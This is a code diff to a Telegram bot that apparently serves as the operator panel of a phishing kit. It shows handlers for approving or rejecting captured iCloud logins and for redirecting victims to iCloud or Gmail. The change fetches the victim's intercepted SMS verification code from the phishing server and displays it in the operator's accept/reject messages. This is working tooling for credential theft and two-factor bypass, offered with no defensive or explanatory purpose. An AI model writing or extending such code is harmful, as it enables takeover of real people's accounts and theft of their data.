@@ -388,14 +388,19 @@ bot.on("callback_query", async (query) => {
     // ============================================================================
     
     let email = identifier;
-    let displayValue = email;  // ✅ What to show in the message
+    let smsCode = "";
 
-    // ✅ For SMS callbacks, get email from server
+    // ✅ For SMS callbacks, get SMS code from server
     if (action.startsWith("sms_") && identifier && identifier.includes("sms_code_")) {
-      // For SMS callbacks, identifier is requestId, email should be extracted
-      // Since we can't access server's pendingCodes here, just use email placeholder
-      displayValue = identifier;  // Show requestId if we don't have email
-      console.log(`📝 SMS callback: requestId ${identifier}`);
+      try {
+        const response = await fetch(`${APP_URL}/get-sms-code?requestId=${encodeURIComponent(identifier)}`);
+        const data = await response.json();
+        smsCode = data.smsCode || identifier;
+        console.log(`📝 SMS callback: requestId ${identifier} → code ${smsCode}`);
+      } catch (err) {
+        console.error("Error fetching SMS code:", err);
+        smsCode = identifier;
+      }
     }
 
     // ✅ STEP 1: Set winner on first click (Page 1 only - don't set for SMS!)
@@ -466,9 +471,9 @@ bot.on("callback_query", async (query) => {
       } else if (action === "page_reject") {
         statusMessage = `☁️ <code>${email}</code> iCloud Login <b>REJECTED</b>! ❌`;
       } else if (action === "sms_accept") {
-        statusMessage = `💬 SMS <b>ACCEPTED</b>! ✅`;
+        statusMessage = `💬 <code>${smsCode}</code> SMS <b>ACCEPTED</b>! ✅`;
       } else if (action === "sms_reject") {
-        statusMessage = `💬 SMS <b>REJECTED</b>! ❌`;
+        statusMessage = `💬 <code>${smsCode}</code> SMS <b>REJECTED</b>! ❌`;
       } else if (action === "redirect_icloud") {
         statusMessage = `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`;
       } else if (action === "redirect_gmail") {
